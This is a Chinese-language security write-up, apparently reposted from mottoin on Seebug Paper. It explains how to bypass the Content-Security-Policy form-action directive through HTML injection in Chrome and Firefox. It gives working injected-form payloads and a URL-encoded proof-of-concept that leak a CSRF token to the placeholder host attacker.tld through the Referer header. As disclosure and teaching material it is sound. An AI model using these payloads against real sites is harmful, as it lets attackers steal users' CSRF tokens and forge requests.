本文来源：[mottoin](http://www.mottoin.com/93211.html)

CSP(Content-Security-Policy)是一个HTTP响应头，该响应头包含了指示浏览器如何限制页面上的内容的指令。 例如，”form-action”指令限制了可以提交的原始表单。CSP form-action指令可以限制页面可以提交表单到那些URL。在XSS/HTML注入错误的情况下，可以绕过此保护。

### form-action指令

要理解为什么”form-action”指令从安全角度来说很重要，请想象下面这种情况：

    
    
    Content-Security-Policy: default-src ‘none’; 
    
    <html>
    
    <body>
    
    <div>[Reflected XSS vulnerability here]</div>
    
    <form method=”POST” id=”subscribe” action=”/api/v1/newsletter/subscribe”>
    
    <input type=”hidden” name=”csrftoken” value=”5f4dcc3b5aa765d61d8327deb882cf99” />
    
    <input type=”submit” value=”Subscribe to newsletter” />
    
    </form>
    
    </body>
    
    </html>

由于CSP不允许脚本，我们不能使用脚本来提取csrf令牌。 然而，通过注入一个`<form>`标签，我们可以覆盖提交表单（包括csrf令牌）的位置：

    
    
    Content-Security-Policy: default-src ‘none’; 
    
    <html>
    
    <body>
    
    <div><form action=”http://attacker.tld”></div>
    
    <form method=”POST” id=”subscribe” action=”/api/v1/newsletter/subscribe”>
    
    <input type=”hidden” name=”csrftoken” value=”5f4dcc3b5aa765d61d8327deb882cf99” />
    
    <input type=”submit” value=”Subscribe to newsletter” />
    
    </form>
    
    </body>
    
    </html>

### 在Chrome中绕过

可以通过将现有表单的方法（使用formmethod属性）重写为”GET”并将操作（使用formaction属性）重写为””（当前页面）来绕过该伪指令。然后，我们将此与泄露元素相结合（例如“`<link
rel=’subresource’ href =’http://attacker.tld/link-subresource’>`”）

    
    
    Content-Security-Policy: default-src ‘none’; 
    
    <html>
    
    <body>
    
    <div><input value="CLICK ME FOR POC" type="submit" formaction="" form="subscribe" formmethod="get" /><input type="hidden" name="xss" form="subscribe" value="<link rel='subresource' href='http://attacker.tld/link-subresource'>"/></div>
    
    <form method="POST" id="subscribe" action="/api/v1/newsletter/subscribe">
    
    <input type="hidden" name="csrftoken" value="5f4dcc3b5aa765d61d8327deb882cf99" />
    
    <input type="submit" value="Subscribe to newsletter" />
    
    </form>
    
    </body>
    
    </html>

当受害者点击注入的提交按钮时，浏览器将把表单值作为GET参数发送到当前页面。
这些GET参数然后泄漏给attacker.tld，因为引用了泄露元素。换句话说，表单值（包括CSRF令牌）将通过Referer头发送到http://attacker.tld
。 form-action绕过成功。

### Demo

    
    
    http://bugbounty.se/csp_bypass.php?xss=%3Cinput%20value=%22CLICK%20ME%20FOR%20POC%22%20type=%22submit%22%20formaction=%22%22%20form=%22subscribe%22%20formmethod=%22get%22%20/%3E%3Cinput%20type=%22hidden%22%20name=%22xss%22%20form=%22subscribe%22%20value=%22%3Clink%20rel=%27subresource%27%20href=%27http://attacker.tld/link-subresource%27%3E%22/%3E

### 后果

![](https://images.seebug.org/content/images/2017/02/CSP.png-w331s)

### 在Firefox中绕过

Firefox的攻击本质上是一样的，但不是使用”`<link rel =’subresource’href
=’http://attacker.tld”>`”，我们使用”`<a href
=’http://attacker.tld’>`”，使用这个的缺点是用户必须点击两次而不是一次。

来源链接：http://www.mottoin.com/93211.html

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/135/>

